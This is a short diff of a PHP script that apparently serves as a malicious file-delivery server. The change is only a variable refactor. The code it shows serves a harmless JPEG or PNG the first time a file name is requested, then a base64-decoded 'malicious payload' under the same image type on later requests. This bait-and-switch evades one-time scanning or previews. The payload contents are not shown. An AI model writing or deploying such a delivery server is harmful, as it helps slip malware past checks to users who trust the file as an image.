@@ -98,17 +98,17 @@ if (isset($_REQUEST['get'])) {
     if (!is_known_file($requested_file)) {
         // respond to the first request with a benign file
         record_known_file($requested_file);
-        if (strpos($_REQUEST['get'], '.jpeg')) {
-            send_file('image/jpg', $_REQUEST['get'], base64_decode($jpg));
-        } else if (strpos($_REQUEST['get'], '.png')) {
-            send_file('image/png', $_REQUEST['get'], base64_decode($png));
+        if (strpos($requested_file, '.jpeg')) {
+            send_file('image/jpg', $requested_file, base64_decode($jpg));
+        } else if (strpos($requested_file, '.png')) {
+            send_file('image/png', $requested_file, base64_decode($png));
         }
     } else {
         // respond to the second request with the malicious payload
-        if (strpos($_REQUEST['get'], '.jpeg')) {
-            send_file('image/jpg', $_REQUEST['get'], base64_decode($payload));
-        } else if (strpos($_REQUEST['get'], '.png')) {
-            send_file('image/png', $_REQUEST['get'], base64_decode($payload));
+        if (strpos($requested_file, '.jpeg')) {
+            send_file('image/jpg', $requested_file, base64_decode($payload));
+        } else if (strpos($requested_file, '.png')) {
+            send_file('image/png', $requested_file, base64_decode($payload));
         }
     }
 }
